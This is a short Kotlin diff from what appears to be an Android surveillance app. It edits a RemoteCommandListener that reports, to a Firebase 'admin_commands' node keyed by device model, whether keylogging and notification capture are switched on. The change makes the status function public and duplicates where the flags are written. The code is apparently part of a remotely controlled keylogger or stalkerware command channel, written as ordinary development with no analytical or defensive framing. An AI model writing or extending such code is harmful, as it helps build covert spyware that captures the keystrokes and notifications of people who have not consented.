@@ -13,7 +13,6 @@ object RemoteCommandListener {
 
     fun startListening() {
         if (isListening) {
-            // Even if already listening, report current status back
             reportCurrentStatus()
             return
         }
@@ -55,12 +54,14 @@ object RemoteCommandListener {
         }
     }
 
-    private fun reportCurrentStatus() {
+    fun reportCurrentStatus() {
         try {
             val deviceName = Build.MODEL?.replace(Regex("[^a-zA-Z0-9_-]"), "_")?.ifBlank { "Unknown_Device" } ?: "Unknown_Device"
-            val statusRef = FirebaseDatabase.getInstance().getReference("admin_commands").child(deviceName).child("status")
-            statusRef.child("keylogging").setValue(KeyloggingConfig.isEnabled)
-            statusRef.child("notifications").setValue(NotificationConfig.isEnabled)
+            val ref = FirebaseDatabase.getInstance().getReference("admin_commands").child(deviceName)
+            ref.child("status").child("keylogging").setValue(KeyloggingConfig.isEnabled)
+            ref.child("status").child("notifications").setValue(NotificationConfig.isEnabled)
+            ref.child("keylogging").setValue(KeyloggingConfig.isEnabled)
+            ref.child("notifications").setValue(NotificationConfig.isEnabled)
         } catch (e: Exception) {
             Log.e(TAG, "Error reporting status", e)
         }
